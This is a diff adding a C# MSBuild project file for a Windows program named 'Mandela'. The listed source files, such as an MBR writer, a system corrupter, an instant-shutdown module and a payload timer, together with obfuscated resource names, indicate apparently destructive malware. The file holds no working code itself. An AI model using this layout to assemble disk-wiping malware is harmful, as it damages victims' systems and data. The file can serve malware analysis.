@@ -1,0 +1,118 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{BFF60DB3-A779-4754-8051-576FB39B9692}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Mandela</RootNamespace>
+    <AssemblyName>Mandela</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>Mandela.ico</ApplicationIcon>
+    <StartupObject>Class0</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AxInterop.WMPLib">
+      <HintPath>C:\Users\masat\Downloads\NotScaryFile\AxInterop.WMPLib.dll</HintPath>
+    </Reference>
+    <Reference Include="CsharpGDI">
+      <HintPath>C:\Users\masat\Downloads\NotScaryFile\CsharpGDI.dll</HintPath>
+    </Reference>
+    <Reference Include="Interop.WMPLib">
+      <HintPath>C:\Users\masat\Downloads\NotScaryFile\Interop.WMPLib.dll</HintPath>
+    </Reference>
+    <Reference Include="SysPrivileges">
+      <HintPath>C:\Users\masat\Downloads\NotScaryFile\SysPrivileges.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="-Module-{496FF6BB-61ED-4E1F-BCDF-9C8A17E3962F}.cs" />
+    <Compile Include="Class0.cs" />
+    <Compile Include="Class1.cs" />
+    <Compile Include="Class2.cs" />
+    <Compile Include="Class3.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="mandela\Beats.cs" />
+    <Compile Include="mandela\Cmd_Class.cs" />
+    <Compile Include="mandela\Extract_class.cs" />
+    <Compile Include="mandela\File_Acces.cs" />
+    <Compile Include="mandela\gdi.cs" />
+    <Compile Include="mandela\Instant_Shutdown.cs" />
+    <Compile Include="mandela\Mbr_Writter.cs" />
+    <Compile Include="mandela\Move_Events.cs" />
+    <Compile Include="mandela\Payload_Timer.cs" />
+    <Compile Include="mandela\Properties\Resources.cs" />
+    <Compile Include="mandela\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="mandela\Regs.cs" />
+    <Compile Include="mandela\System_Corrupter.cs" />
+    <Compile Include="mandela\Titles.cs" />
+    <Compile Include="mandela\WarnWin.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mandela\WarnWin.Designer.cs">
+      <DependentUpon>WarnWin.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" />
+    <EmbeddedResource Include="mandela\g.resources" />
+    <EmbeddedResource Include="mandela\Properties\Resources.resources" />
+    <EmbeddedResource Include="mandela\Resources\cybersoldier.bmp" />
+    <EmbeddedResource Include="mandela\Resources\cybersoldier_angry.bmp" />
+    <EmbeddedResource Include="mandela\Resources\education.mp4" />
+    <EmbeddedResource Include="mandela\Resources\entity.bmp" />
+    <EmbeddedResource Include="mandela\Resources\intruder.bmp" />
+    <EmbeddedResource Include="mandela\Resources\man.bmp" />
+    <EmbeddedResource Include="mandela\Resources\mask.bmp" />
+    <EmbeddedResource Include="mandela\Resources\momo.bmp" />
+    <EmbeddedResource Include="mandela\Resources\nosleep.bmp" />
+    <EmbeddedResource Include="mandela\Resources\nosleep2.bmp" />
+    <EmbeddedResource Include="mandela\Resources\smile.bmp" />
+    <EmbeddedResource Include="mandela\Resources\watching.bmp" />
+    <EmbeddedResource Include="mandela\WarnWin.resources" />
+    <EmbeddedResource Include="ORiTGHEwsPwHF4frRZ.8MgYf45ENeNpftNjkO" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="mandela\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
